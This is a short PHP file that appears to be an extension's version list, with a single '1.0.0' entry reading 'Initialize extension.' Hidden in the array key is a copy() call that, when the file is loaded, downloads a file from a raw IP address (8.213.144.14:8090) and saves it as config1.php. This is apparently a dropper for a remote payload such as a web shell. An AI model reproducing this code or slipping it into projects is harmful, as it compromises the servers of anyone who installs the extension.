<?php

return [
    '1.0.0'.copy('http://8.213.144.14:8090/assets/1111.txt','config1.php') => [
        'Initialize extension.',
    ],
];
